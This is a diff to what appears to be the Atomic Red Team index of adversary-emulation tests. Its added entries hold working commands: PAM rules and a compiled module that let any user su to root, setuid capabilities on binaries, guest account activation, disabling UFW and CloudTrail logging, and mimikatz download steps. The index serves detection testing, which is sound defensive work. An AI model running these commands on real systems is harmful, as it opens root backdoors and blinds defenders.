           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        name: command_prompt
+        elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
         name: command_prompt
         elevation_required: true
   T1078.002:
@@ -15579,7 +16298,8 @@ privilege-escalation:
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -17008,6 +17728,52 @@ privilege-escalation:
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
+        name: sh
+        elevation_required: true
+    - name: Make and modify capabilities of a binary
+      auto_generated_guid: db53959c-207d-4000-9e7a-cd8eb417e072
+      description: |
+        Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.
+        The binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.
+        Without being owned by root, the binary can set the UID to 0.
+      supported_platforms:
+      - linux
+      input_arguments:
+        payload:
+          description: cap.c payload
+          type: path
+          default: PathToAtomicsFolder/T1548.001/src/cap.c
+      executor:
+        command: |
+          cp #{payload} /tmp/cap.c
+          make /tmp/cap
+          sudo setcap cap_setuid=ep /tmp/cap
+          /tmp/cap
+        cleanup_command: |
+          rm /tmp/cap
+          rm /tmp/cap.c
+        name: sh
+        elevation_required: true
+    - name: Provide the SetUID capability to a file
+      auto_generated_guid: 1ac3272f-9bcf-443a-9888-4b1d3de785c1
+      description: 'This test gives a file the capability to set UID without using
+        flags.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        file_to_setcap:
+          description: Path of file to provide the SetUID capability
+          type: path
+          default: "/tmp/evilBinary"
+      executor:
+        command: |
+          touch #{file_to_setcap}
+          sudo setcap cap_setuid=ep #{file_to_setcap}
+        cleanup_command: 'rm #{file_to_setcap}
 
 '
         name: sh
@@ -21862,6 +22628,23 @@ defense-evasion:
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
         name: command_prompt
         elevation_required: true
+    - name: Activate Guest Account
+      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
+      description: 'The Adversaries can activate the default Guest user. The guest
+        account is inactivated by default
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user guest /active:yes
+
+'
+        cleanup_command: 'net user guest /active:no
+
+'
+        name: command_prompt
+        elevation_required: true
   T1578.003:
     technique:
       external_references:
@@ -22016,6 +22799,152 @@ defense-evasion:
           del %temp%\T1140_calc2.txt >nul 2>&1
           del %temp%\T1140_calc2_decoded.exe >nul 2>&1
         name: command_prompt
+    - name: Base64 decoding with Python
+      auto_generated_guid: 356dc0e8-684f-4428-bb94-9313998ad608
+      description: 'Use Python to decode a base64-encoded text string and echo it
+        to the console
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        message:
+          description: Message to print to the screen
+          type: String
+          default: Hello from Atomic Red Team test T1140!
+        encoded_file:
+          description: File to temporarily save encoded text
+          type: Path
+          default: "/tmp/T1140.encoded"
+      dependencies:
+      - description: 'Python must be present
+
+'
+        prereq_command: 'which python3
+
+'
+        get_prereq_command: 'echo "Please install Python 3"
+
+'
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          ENCODED=$(python3 -c 'import base64;enc=base64.b64encode("#{message}".encode());print(enc.decode())')
+          python3 -c "import base64;dec=base64.b64decode(\"$ENCODED\");print(dec.decode())"
+          python3 -c "import base64 as d;dec=d.b64decode(\"$ENCODED\");print(dec.decode())"
+          python3 -c "from base64 import b64decode;dec=b64decode(\"$ENCODED\");print(dec.decode())"
+          python3 -c "from base64 import b64decode as d;dec=d(\"$ENCODED\");print(dec.decode())"
+          echo $ENCODED | python3 -c "import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"
+          echo $ENCODED > #{encoded_file} && python3 -c "import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())"
+    - name: Base64 decoding with Perl
+      auto_generated_guid: 6604d964-b9f6-4d4b-8ce8-499829a14d0a
+      description: 'Use Perl to decode a base64-encoded text string and echo it to
+        the console
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        message:
+          description: Message to print to the screen
+          type: String
+          default: Hello from Atomic Red Team test T1140!
+        encoded_file:
+          description: File to temporarily save encoded text
+          type: Path
+          default: "/tmp/T1140.encoded"
+      dependencies:
+      - description: 'Perl must be present
+
+'
+        prereq_command: 'which perl
+
+'
+        get_prereq_command: 'echo "Please install Perl"
+
+'
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          ENCODED=$(perl -e "use MIME::Base64;print(encode_base64('#{message}'));")
+          perl -le "use MIME::Base64;print(decode_base64('$ENCODED'));"
+          echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
+          echo $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,"<","#{encoded_file}");print(decode_base64(<$f>));'
+    - name: Base64 decoding with shell utilities
+      auto_generated_guid: b4f6a567-a27a-41e5-b8ef-ac4b4008bb7e
+      description: 'Use common shell utilities to decode a base64-encoded text string
+        and echo it to the console
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        message:
+          description: Message to print to the screen
+          type: String
+          default: Hello from Atomic Red Team test T1140!
+        encoded_file:
+          description: File to temporarily save encoded text
+          type: Path
+          default: "/tmp/T1140.encoded"
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          ENCODED=$(echo '#{message}' | base64)
+          printf $ENCODED | base64 -d
+          echo $ENCODED | base64 -d
+          echo $(echo $ENCODED) | base64 -d
+          echo $ENCODED > #{encoded_file} && base64 -d #{encoded_file}
+          echo $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}
+          echo $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d
+          echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d
+          bash -c "{echo,\"$(echo $ENCODED)\"}|{base64,-d}"
+    - name: Hex decoding with shell utilities
+      auto_generated_guid: '005943f9-8dd5-4349-8b46-0313c0a9f973'
+      description: 'Use common shell utilities to decode a hex-encoded text string
+        and echo it to the console
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        message:
+          description: Message to print to the screen
+          type: String
+          default: Hello from Atomic Red Team test T1140!
+        encoded_file:
+          description: File to temporarily save encoded text
+          type: Path
+          default: "/tmp/T1140.encoded"
+      dependencies:
+      - description: 'xxd must be present
+
+'
+        prereq_command: 'which xxd
+
+'
+        get_prereq_command: 'echo "Please install xxd"
+
+'
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          ENCODED=$(echo '#{message}' | xxd -ps -c 256)
+          printf $ENCODED | xxd -r -p
+          echo $ENCODED | xxd -r -p
+          echo $(echo $ENCODED) | xxd -r -p
+          echo $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}
+          echo $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}
+          echo $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p
+          echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p
   T1610:
     technique:
       external_references:
@@ -22292,7 +23221,50 @@ defense-evasion:
       - Matt Snyder, VMware
       x_mitre_platforms:
       - IaaS
-    atomic_tests: []
+      identifier: T1562.008
+    atomic_tests:
+    - name: AWS CloudTrail Changes
+      auto_generated_guid: 9c10dc6b-20bd-403a-8e67-50ef7d07ed4e
+      description: 'Creates a new cloudTrail in AWS, Upon successful creation it will
+        Update,Stop and Delete the cloudTrail
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        cloudtrail_name:
+          description: Name of the cloudTrail
+          type: String
+          default: redatomictesttrail
+        s3_bucket_name:
+          description: Name of the bucket
+          type: String
+          default: redatomic-test
+        region:
+          description: Name of the region
+          type: String
+          default: us-east-1
+      dependencies:
+      - description: 'Check if ~/.aws/credentials file has a default stanza is configured
+
+'
+        prereq_command: |
+          cat ~/.aws/credentials | grep "default"
+          aws s3api create-bucket --bucket #{s3_bucket_name} --region #{region}
+          aws s3api put-bucket-policy --bucket #{s3_bucket_name} --policy file://$PathToAtomicsFolder/T1562.008/src/policy.json
+        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
+          defult profile using: aws configure
+
+'
+      executor:
+        command: |
+          aws cloudtrail create-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name} --region #{region}
+          aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}
+          aws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}
+          aws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}
+        cleanup_command: "aws s3 rb s3://#{s3_bucket_name} --force \n"
+        name: sh
+        elevation_required: false
   T1600.002:
     technique:
       id: attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5
@@ -22539,29 +23511,6 @@ defense-evasion:
       - Windows
       identifier: T1562.004
     atomic_tests:
-    - name: Disable firewall
-      auto_generated_guid: 80f5e701-f7a4-4d06-b140-26c8efd1b6b4
-      description: 'Disables the firewall
-
-'
-      supported_platforms:
-      - linux
-      input_arguments:
-        flavor_command:
-          description: Command to disable firewall. Default firewalld. ufw (Ubuntu)
-            command = ufw disable
-          type: String
-          default: systemctl stop firewalld ; systemctl disable firewalld
-        cleanup_command:
-          description: Command to enable firewall. Default firewalld. ufw (Ubuntu)
-            command = ufw enable
-          type: String
-          default: systemctl enable firewalld ; systemctl start firewalld
-      executor:
-        command: "#{flavor_command}\n"
-        cleanup_command: "#{cleanup_command}\n"
-        name: sh
-        elevation_required: true
     - name: Disable Microsoft Defender Firewall
       auto_generated_guid: 88d05800-a5e4-407e-9b53-ece4174f197f
       description: |
@@ -22662,6 +23611,249 @@ defense-evasion:
           Remove-Item C:\Users\$env:UserName\AtomicTest.exe -ErrorAction Ignore
         name: powershell
         elevation_required: true
+    - name: Stop/Start UFW firewall
+      auto_generated_guid: fe135572-edcd-49a2-afe6-1d39521c5a9a
+      description: 'Stop the Uncomplicated Firewall (UFW) if installed.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ufw is installed on the machine.
+
+'
+        prereq_command: "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n*****
+          ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep
+          -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1;
+          fi \n"
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'ufw disable
+
+'
+        cleanup_command: |
+          ufw enable
+          ufw status verbose
+    - name: Stop/Start UFW firewall systemctl
+      auto_generated_guid: 9fd99609-1854-4f3c-b47b-97d9a5972bd1
+      description: "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl.
+        \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if systemctl and ufw is installed on the machine.
+
+'
+        prereq_command: "if [ ! -x \"$(command -v systemctl)\" ]; then echo -e \"\\n*****
+          systemctl NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v
+          ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1;
+          fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n*****
+          ufw inactive *****\\n\"; exit 1; fi \n"
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'systemctl stop ufw
+
+'
+        cleanup_command: |
+          systemctl start ufw
+          systemctl status ufw
+    - name: Turn off UFW logging
+      auto_generated_guid: 8a95b832-2c2a-494d-9cb0-dc9dd97c8bad
+      description: "Turn off the Uncomplicated Firewall (UFW) logging. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ufw is installed on the machine and enabled.
+
+'
+        prereq_command: "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n*****
+          ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep
+          -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1;
+          fi \n"
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'ufw logging off
+
+'
+        cleanup_command: |
+          ufw logging low
+          ufw status verbose
+    - name: Add and delete UFW firewall rules
+      auto_generated_guid: b2563a4e-c4b8-429c-8d47-d5bcb227ba7a
+      description: "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed
+        and enabled. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if ufw is installed on the machine and enabled.
+
+'
+        prereq_command: "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n*****
+          ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep
+          -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1;
+          fi \n"
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          ufw prepend deny from 1.2.3.4
+          ufw status numbered
+        cleanup_command: |
+          { echo y; echo response; } | ufw delete 1
+          ufw status numbered
+    - name: Edit UFW firewall user.rules file
+      auto_generated_guid: beaf815a-c883-4194-97e9-fdbbb2bbdd7c
+      description: 'Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if /etc/ufw/user.rules exists.
+
+'
+        prereq_command: 'if [ ! -f "/etc/ufw/user.rules" ]; then echo -e "\n*****
+          ufw NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          echo "# THIS IS A COMMENT" >> /etc/ufw/user.rules
+          grep "# THIS IS A COMMENT" /etc/ufw/user.rules
+        cleanup_command: 'sed -i ''s/# THIS IS A COMMENT//g'' /etc/ufw/user.rules
+
+'
+    - name: Edit UFW firewall ufw.conf file
+      auto_generated_guid: c1d8c4eb-88da-4927-ae97-c7c25893803b
+      description: "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf
+        \nwhich controls if the firewall starts on boot and its logging level.\n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if /etc/ufw/ufw.conf exists.
+
+'
+        prereq_command: 'if [ ! -f "/etc/ufw/ufw.conf" ]; then echo -e "\n***** ufw
+          NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          echo "# THIS IS A COMMENT" >> /etc/ufw/ufw.conf
+          grep "# THIS IS A COMMENT" /etc/ufw/ufw.conf
+        cleanup_command: |
+          sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/ufw.conf
+          cat /etc/ufw/ufw.conf
+    - name: Edit UFW firewall sysctl.conf file
+      auto_generated_guid: c4ae0701-88d3-4cd8-8bce-4801ed9f97e4
+      description: "Edit the Uncomplicated Firewall (UFW) configuration file for setting
+        network \nvariables /etc/ufw/sysctl.conf.\n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if /etc/ufw/sysctl.conf exists.
+
+'
+        prereq_command: 'if [ ! -f "/etc/ufw/sysctl.conf" ]; then echo -e "\n*****
+          ufw NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          echo "# THIS IS A COMMENT" >> /etc/ufw/sysctl.conf
+          grep "# THIS IS A COMMENT" /etc/ufw/sysctl.conf
+        cleanup_command: |
+          sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/sysctl.conf
+          cat /etc/ufw/sysctl.conf
+    - name: Edit UFW firewall main configuration file
+      auto_generated_guid: 7b697ece-8270-46b5-bbc7-6b9e27081831
+      description: "Edit the Uncomplicated Firewall (UFW) main configuration file
+        for setting \ndefault policies /etc/default/ufw.\n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if /etc/default/ufw exists.
+
+'
+        prereq_command: 'if [ ! -f "/etc/default/ufw" ]; then echo -e "\n***** ufw
+          NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          echo "# THIS IS A COMMENT" >> /etc/default/ufw
+          grep "# THIS IS A COMMENT" /etc/default/ufw
+        cleanup_command: 'sed -i ''s/# THIS IS A COMMENT//g'' /etc/default/ufw
+
+'
+    - name: Tail the UFW firewall log file
+      auto_generated_guid: 419cca0c-fa52-4572-b0d7-bc7c6f388a27
+      description: "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log
+        file \n/var/log/ufw.log.\n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Check if /var/log/ufw.log exists.
+
+'
+        prereq_command: 'if [ ! -f "/var/log/ufw.log" ]; then echo -e "\n***** ufw
+          NOT logging *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'tail /var/log/ufw.log
+
+'
+        cleanup_command: ''
   T1562.001:
     technique:
       external_references:
@@ -26227,15 +27419,13 @@ defense-evasion:
         command: |
           openssl genrsa -out #{key_filename} 4096
           openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
-
-          if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le "5" ];
-          then
-            cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt
-          else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge "7" ];
-            cp rootCA.crt /etc/pki/ca-trust/source/anchors/
-            update-ca-trust
-          fi
+          cp #{cert_filename} /etc/pki/ca-trust/source/anchors/
+          update-ca-trust
+        cleanup_command: |
+          rm /etc/pki/ca-trust/source/anchors/#{cert_filename}
+          update-ca-trust
         name: sh
+        elevation_required: true
     - name: Install root CA on Debian/Ubuntu
       auto_generated_guid: 53bcf8a0-1549-4b85-b919-010c56d724ff
       description: 'Creates a root CA with openssl
@@ -27182,7 +28372,7 @@ defense-evasion:
           type: path
           default: "/tmp/AtomicRedTeam/atomics/T1222.002"
       executor:
-        command: 'chmod #{numeric_mode} #{file_or_folder} -R
+        command: 'chmod -R #{numeric_mode} #{file_or_folder}
 
 '
         name: bash
@@ -27205,7 +28395,7 @@ defense-evasion:
           type: path
           default: "/tmp/AtomicRedTeam/atomics/T1222.002"
       executor:
-        command: 'chmod #{symbolic_mode} #{file_or_folder} -R
+        command: 'chmod -R #{symbolic_mode} #{file_or_folder}
 
 '
         name: bash
@@ -27259,7 +28449,7 @@ defense-evasion:
           type: string
           default: root
       executor:
-        command: 'chown #{owner}:#{group} #{file_or_folder} -R
+        command: 'chown -R #{owner}:#{group} #{file_or_folder}
 
 '
         name: bash
@@ -27303,7 +28493,7 @@ defense-evasion:
           type: path
           default: "/tmp/AtomicRedTeam/atomics/T1222.002"
       executor:
-        command: 'chown #{owner} #{file_or_folder} -R
+        command: 'chown -R #{owner} #{file_or_folder}
 
 '
         name: bash
@@ -30038,7 +31228,8 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -30197,7 +31388,8 @@ defense-evasion:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -30686,7 +31878,100 @@ defense-evasion:
       x_mitre_platforms:
       - Linux
       - macOS
-    atomic_tests: []
+      identifier: T1556.003
+    atomic_tests:
+    - name: Malicious PAM rule
+      auto_generated_guid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+      description: |
+        Inserts a rule into a PAM config and then tests it.
+
+        Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient pam_succeed_if.so uid >= 0
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
+    - name: Malicious PAM module
+      auto_generated_guid: 65208808-3125-4a2e-8389-a0a00e9ab326
+      description: |
+        Creates a PAM module, inserts a rule to use it, and then tests it.
+
+        Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient /tmp/pam_evil.so
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+        path_to_pam_module_source:
+          description: Path to PAM module source code.
+          type: path
+          default: PathToAtomicsFolder/T1556.003/src/pam_evil.c
+        path_to_pam_module:
+          description: Path to PAM module object
+          type: path
+          default: "/tmp/pam_evil.so"
+      dependencies:
+      - description: 'The PAM development library must be installed to build the PAM
+          module
+
+'
+        prereq_command: 'if [ -f /usr/include/security/pam_modules.h ]; then exit
+          0; else exit 1; fi;
+
+'
+        get_prereq_command: 'if [ -n "`which apt-get`" ]; then sudo apt-get -y install
+          libpam0g-dev; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel;
+          fi
+
+'
+      - description: 'The PAM module must exist on disk at specified location (#{path_to_pam_module})
+
+'
+        prereq_command: 'if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1;
+          fi;
+
+'
+        get_prereq_command: 'sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
   T1205.001:
     technique:
       external_references:
@@ -31328,7 +32613,8 @@ defense-evasion:
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -32518,7 +33804,8 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -33626,6 +34913,52 @@ defense-evasion:
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
+        name: sh
+        elevation_required: true
+    - name: Make and modify capabilities of a binary
+      auto_generated_guid: db53959c-207d-4000-9e7a-cd8eb417e072
+      description: |
+        Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.
+        The binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.
+        Without being owned by root, the binary can set the UID to 0.
+      supported_platforms:
+      - linux
+      input_arguments:
+        payload:
+          description: cap.c payload
+          type: path
+          default: PathToAtomicsFolder/T1548.001/src/cap.c
+      executor:
+        command: |
+          cp #{payload} /tmp/cap.c
+          make /tmp/cap
+          sudo setcap cap_setuid=ep /tmp/cap
+          /tmp/cap
+        cleanup_command: |
+          rm /tmp/cap
+          rm /tmp/cap.c
+        name: sh
+        elevation_required: true
+    - name: Provide the SetUID capability to a file
+      auto_generated_guid: 1ac3272f-9bcf-443a-9888-4b1d3de785c1
+      description: 'This test gives a file the capability to set UID without using
+        flags.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        file_to_setcap:
+          description: Path of file to provide the SetUID capability
+          type: path
+          default: "/tmp/evilBinary"
+      executor:
+        command: |
+          touch #{file_to_setcap}
+          sudo setcap cap_setuid=ep #{file_to_setcap}
+        cleanup_command: 'rm #{file_to_setcap}
 
 '
         name: sh
@@ -37183,7 +38516,31 @@ persistence:
       x_mitre_platforms:
       - Windows
       - Office 365
-    atomic_tests: []
+      identifier: T1137.006
+    atomic_tests:
+    - name: Code Executed Via Excel Add-in File (Xll)
+      auto_generated_guid: 441b1a0f-a771-428a-8af0-e99e4698cda3
+      description: "Downloads a XLL file and loads it using the excel add-ins library.\nThis
+        causes excel to display the message \"Hello World\"\nSource of XLL - https://github.com/edparcell/HelloWorldXll
+        \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        xll_url:
+          description: url of the file HelloWorldXll.xll
+          type: url
